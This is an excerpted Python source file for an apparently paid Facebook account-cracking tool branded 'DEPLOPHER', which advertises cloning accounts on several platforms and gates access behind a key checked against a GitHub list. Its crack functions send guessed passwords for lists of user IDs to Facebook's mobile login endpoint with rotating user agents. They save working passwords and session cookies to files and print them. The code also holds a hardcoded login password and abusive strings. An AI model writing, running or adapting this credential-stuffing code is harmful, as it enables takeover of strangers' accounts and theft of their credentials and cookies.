...
time.sleep(5)
os.system('clear')
print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mJOIN MY FB")
time.sleep(2)
os.system(f'xdg-open https://www.facebook.com/profile.php?id=100087981621437')
#------------------[ DEPLOPHER-King ]-------------------#
#------------------[ USER-AGENT ]-------------------#
...
def back():
    login()
def contact():
    #os.system('xdg-open https://www.facebook.com/profile.php?id=100087981621437')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
...
\033            ░      ░                 ░  ░       ░                     × xwd
   ...
   ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
   \033[1;97m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
   ║    Author                   • \33[1;38m PRITAM XWD]\33[1;38m    ║\033[1;31m 
   ║    Facebook                 • Pritam ]  ║  \033[1;97m  
   ║    Github                   • \33[1;38म Pritam ]  ║\33[1;34m   
   ║    Whatsapp                 • 01311****** ] ║\33[1;35m 
   ║    TOOLS                    • PAID ]        ║ \33[1;32m   
...
fuckyoursali =(""" \033[32;1m[𝟷] Your Key IS SUCCESSFULLY APPROVED""")
xudinaministar =(""" \033[38;1m[-] Importent Note """)
hedaborakarent =(""" \033[35;1m[𝟸] Bypass USER FUCK YOUR MOTHER """)
...
def meyexudi():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/PR179MH3R3/Approval/blob/main/Pritam.txt').text
    if id in httpCaht:
      print(fuckyoursali)
      ...
      print('\33[1;37m =============================================')
      print(' \x1b[38;5;208m[√] \33[0;41mTHIS TOOL IS PAID\033[0;92m')      
      print(' \x1b[1;98m[√] \33[0;42mFREE FIRE,PUBG,TIKTOK ACCOUNT CLONE\033[0;92m')
      print(' \x1b[1;97m[√] DATA & WIFI BOTH WORKING')
      print(' \x1b[1;95m[√] 3 DAY 60 TAKA  7 DAY 130 TAKA')
      print(' \x1b[38;5;50m[√] ALL COUNTY WORKING')
      print('\33[1;37m =============================================')
      os.system('espeak -a 300 " Hello,   Assalamualaikum,   Please,   Send,   Your,   Key,"')
      input(' \033[37;1mIF U WANT TO BUY THEN PRESS ENTER ')
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://www.facebook.com/profile.php?id=100087981621437'+tks),approval()
      time.sleep(1)
      meyexudi()
  except:
    sys.exit()
meyexudi()
#os.system("python Trevor.py")
def naima():
	print('-------------------')
print(logo)
os.system('espeak -a 300 " Your,   Real,   Name,"')
uname =input('\033[1;91m[\033[1;91m•\033[1;91m]\033[1;33m WHAT IS YOUR NAME \033[1;91m: \33[1;31m')
os.system('espeak -a 300 " Welcome,   to,  ArnavKing,  PAID,   Tools"')
def back():
	login()
...
while attemps < 12345677901:
    ...
    if username == 'PRITAM' and password == 'XWD@123':
...
def menu():
    ...
    print('\033[0;97m=================')
    DEPLOPHER = input('\x1b[1;92m[+] CHOOSE: ')
    if DEPLOPHER in ['111']:
        login()
        dump_massal()
    elif DEPLOPHER in ['1']:
        crack_file()
    elif DEPLOPHER in ['2','02']:
       # os.system('xdg-open https://www.facebook.com/arnav.khadka.587')
        os.system("python nono.py")
    elif DEPLOPHER in ['3','03']:
        result()
    elif DEPLOPHER in ['0']:
...
def crack_file():
    ...
    print('\033[1;32m[ Put File Example:  /sdcard/DEPLOPHER.txt  Etc...]')
...
def passwrd():
    ...
    print(f'\033[97;1m[\033[92;1m•\033[97;1m] \033[1;92mJAY DEPLOPHER VAN Speed Up KO LAAGI')
    print('\033[0;97m===============================================')
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}•[DEPLOPHER-M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;96m[DEPLOPHER-Cp👽] {idf} • {pw}')
                ...
                print(f'\r\033[0;92m[DEPLOPHER-Ok❤️] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
                os.system('espeak -a 300 " DEPLOPHER,  Ok,  id"')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[DEPLOPHER-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•DEPLOPHER-Cp] {idf} • {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•DEPLOPHER-Ok] {idf} • {pw} ')
                os.system('espeak -a 300 " Ok,  DEPLOPHER,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
